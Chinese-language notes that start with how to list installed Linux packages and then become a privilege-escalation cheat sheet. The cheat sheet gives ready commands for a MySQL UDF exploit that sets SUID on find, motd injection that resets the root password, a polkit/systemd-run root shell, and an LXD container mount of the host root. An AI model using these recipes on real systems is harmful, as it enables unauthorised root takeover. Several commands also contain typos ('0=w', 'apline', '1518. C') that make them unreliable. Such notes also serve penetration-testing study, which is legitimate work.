# 查看 Linux 安装应用列表
## 使用 apt 查看
使用 apt 查看以安装的应用，会包括其依赖包，数据繁杂
`apt list --installed`    会显示所有安装的包
`apt list --installed | grep "program_name" `  查看固定某个应用的包
## 使用 dpkg 查看
apt 和 apt-get 底层都是由 dpkg 组成，可以使用 dpkg 枚举应用
`dpkg-query -l`   列出所有安装的应用
## 查看最近安装的软件 
使用 dpkg 安装历史
`grep " install " /var/log/dpkg.log`
使用 apt 安装历史
`grep " install " /var/log/apt/history.log`




# Linux MySQL 提权

## 使用 mysql 中的配置不当提权
**提权步骤**
是否可以自定义导出路径，secure_file_priv 为空
`show variables like '%secure%';`
查看当前数据库用户权限
`select * from mysql.user where user = substring_index(user(),'@',1)\G;`
查看 mysql 安装位置
`show variables like '%basedir%';`
搜索 UDF 动态库漏洞利用程序，并在漏洞利用数据库中将其命名为“1518. C”，exploit-1518
将 c 文件编译好
`gcc -g -shared -Wl,-soname,1518.so -o 1518.so 1518.c -lc `
创建一个表
`create table foo(line blob);`
写入 udf 文件内容
`insert into foo values(load_file('/tmp/1518.so'));`
将 udf 文件内容导入
`select * from foo into dumpfile '/usr/lib/mysql/plugin/1518.so';`
创建自定义函数 udf
`create function do_system returns integer soname '1518.so';`
给 find 赋予超级权限
`select do_system('chmod u+s /usr/bin/find'); `
使用 find 命令提权



# Linux motd 提权
## motd （message of the day）注入提权
**提权步骤**
登录 ssh 时会有一些欢迎信息，如果这些信息以 root 运行，并且用户对于这个文件可读可写时，可以提权 ^f1bff2
1）拿到普通用户 shell 时，可以使用以下 bash 命令，获取属主为 root，并且普通用户可以执行，可以写入的文件
`find / -type f -user root -perm -ug=x,0=w -exec ls -l '{}' \;2>/dev/null`
2）发现 update-motd. D/00-header 文件，进行写入，将 root 密码改为 root123
`echo 'root123' | chpasswd`



# Linux polcy kit 提权
## polcy kit 配置不当提权
**提权步骤**
1）首先确认含有 s 位的可执行文件，发现 polkit-agent-helper-1 含有 s 位
2）使用能够触发 helper 的执行文件，如 systemd-run
3）利用 systemd 唤起一个 bash，由于 helper 存在 s 位，则是以 root 用户唤起一个 bash，完成提取
`systemd-run -t /bin/bash`



# Linux LXD提权
## LXD容器提权
**提权原理**
当用户属于lxc组，可以使用lxd容器，可以提权。该方法利用lxd高权限下，可以挂载root目录，或者整个物理机目录，从而实现读取到sudoers或者passwd，authorized_keys等高权限才能读取的文件，从而提权。
**提权步骤**
1）首先创建lxd的镜像，一般从gethub中下载（下载后会有一个文件夹）
`git clone  https://github.com/saghul/lxd-alpine-builder.git`
`cd lxd-alpine-builder`
`./build-alpine`   创建一个lxd镜像，一般为.tar.gz文件
2）导入镜像
`lxc image import ./apline.tar.gz --alias myimage`    导入镜像名称为myimage
`lxc image list`   查看刚刚导入的镜像
3）启动镜像，挂载目录
`lxc init myimage ignite -c security.privileged=true`     初始化镜像
`lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true`   将物理机根目录挂载到虚拟机/mnt/root目录中
`lxc start ignite`    启动镜像
`lxc exec ignite /bin/sh`    以bash进入lxd
最后可以读取到物理机所有文件

